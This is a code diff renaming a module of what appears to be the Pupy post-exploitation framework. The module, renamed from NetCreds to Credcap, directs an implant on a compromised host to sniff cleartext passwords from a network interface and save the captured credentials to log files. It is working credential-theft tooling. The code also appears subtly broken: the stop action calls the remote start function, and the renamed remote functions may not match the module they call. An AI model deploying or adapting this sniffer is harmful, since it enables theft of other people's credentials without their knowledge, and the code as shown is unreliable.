@@ -9,10 +9,10 @@ from pupylib.PupyModule import (
 import os
 import datetime
 
-__class_name__="NetCreds"
+__class_name__="Credcap"
 
 @config(cat="gather", compat=["linux", "windows"])
-class NetCreds(PupyModule):
+class Credcap(PupyModule):
     """
         Sniffs cleartext passwords from interface
     """
@@ -22,7 +22,7 @@ class NetCreds(PupyModule):
 
     @classmethod
     def init_argparse(cls):
-        cls.arg_parser = PupyArgumentParser(prog='netcreds', description=cls.__doc__)
+        cls.arg_parser = PupyArgumentParser(prog='credcap', description=cls.__doc__)
         cls.arg_parser.add_argument("-i", metavar="INTERFACE", dest='interface', default=None, help="Choose an interface (optional)")
         cls.arg_parser.add_argument("-f", metavar="IP", dest='filterip', default=None, help="Do not sniff packets from this IP address; -f 192.168.0.4")
         cls.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])
@@ -32,9 +32,9 @@ class NetCreds(PupyModule):
 
             # Load full scapy
             self.client.load_package('scapy', honor_ignore=False, force=True)
-            netcreds_start = self.client.remote('pupyutils.netcreds', 'netcreds_start', False)
+            credcap_start = self.client.remote('pupyutils.netcreds', 'credcap_start', False)
 
-            r = netcreds_start(args.interface, args.filterip)
+            r = credcap_start(args.interface, args.filterip)
             if r == 'not_root':
                 self.error("Needs root privileges to be started")
             elif not r:
@@ -44,12 +44,12 @@ class NetCreds(PupyModule):
 
         elif args.action=="dump":
             try:
-                os.makedirs(os.path.join("data","netcreds"))
+                os.makedirs(os.path.join("data","credcap"))
             except Exception:
                 pass
 
-            netcreds_dump = self.client.remote('pupyutils.netcreds', 'netcreds_dump')
-            data = netcreds_dump()
+            credcap_dump = self.client.remote('pupyutils.netcreds', 'credcap_dump')
+            data = credcap_dump()
 
             if data is None:
                 self.error("Network credentials sniffer has not been started yet")
@@ -65,14 +65,14 @@ class NetCreds(PupyModule):
                 W = '\033[0m'  # white (normal)
                 T = '\033[93m'  # tan
                 data_no_color=data.replace(W, '').replace(T, '')
-                filepath=os.path.join("data", "netcreds","creds_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".log")
-                self.success("Dumping recorded netcreds in %s"%filepath)
+                filepath=os.path.join("data", "credcap","creds_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".log")
+                self.success("Dumping recorded credcap in %s"%filepath)
                 with open(filepath, 'w') as f:
                     f.write(data_no_color)
 
                 self.log(data)
 
         elif args.action=="stop":
-            netcreds_stop = self.client.remote('pupyutils.netcreds', 'netcreds_start')
-            netcreds_stop()
+            credcap_stop = self.client.remote('pupyutils.netcreds', 'credcap_start')
+            credcap_stop()
             self.success("Network credentials sniffer is stopped")
